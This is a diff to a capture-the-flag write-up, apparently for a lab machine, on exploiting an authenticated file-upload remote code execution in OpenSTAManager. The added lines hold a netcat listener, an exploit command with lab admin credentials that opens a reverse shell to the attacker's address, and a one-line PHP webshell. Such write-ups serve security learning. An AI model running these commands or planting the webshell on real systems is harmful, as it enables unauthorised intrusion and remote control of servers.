@@ -142,19 +142,27 @@ The portal runs **OpenSTAManager**. Logging in as `admin` and reading the versio
 
 ## Exploit OpenSTAManager Authenticated RCE (CVE-2026-38751)
 
-The module update feature allows an authenticated user to upload a ZIP-based module without validation of its contents, deploying a PHP payload into the web root where it executes in the application context.
+OpenSTAManager fails to validate ZIP archives uploaded through the module update endpoint (`/modules/aggiornamenti/upload_modules.php`). An authenticated attacker can upload a crafted ZIP containing a `MODULE` manifest and a PHP webshell, which is extracted into a predictable path under `modules/` and executed in the web server context.
 
 Exploit used:
 
-https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751
+https://github.com/Why-Shell/CVE-2026-38751
+
+Start a listener:
 
 ```bash
-./openstamanager-rce-exploit --url http://support_001.enigma.htb/ -U admin -P 'Ne3s4rtars78s' --lhost <tun0_ip> --lport 4444
+nc -lvnp 8888
 ```
 
-The exploit authenticates, uploads a malicious module containing a PHP webshell (`modules/shell/shell.php`), and returns a reverse shell as `www-data`.
+Run the exploit:
 
-The dropped webshell is a single-line command executor, confirming the file-upload-to-RCE mechanism:
+```bash
+python3 exploit.py -u http://support_001.enigma.htb/ -U admin -P Ne3s4rtars78s --lhost 10.10.15.21 --lport 8888
+```
+
+The script authenticates, enables the module update feature, builds a ZIP in memory containing `shell/MODULE` and `shell/shell.php`, uploads it via the `blob` multipart field, verifies the webshell, and delivers a bash reverse shell as `www-data`.
+
+The dropped webshell is a single-line command executor at `/modules/shell/shell.php`, confirming the file-upload-to-RCE mechanism:
 
 ```php
 <?php isset($_GET["c"]) && system($_GET["c"]); ?>
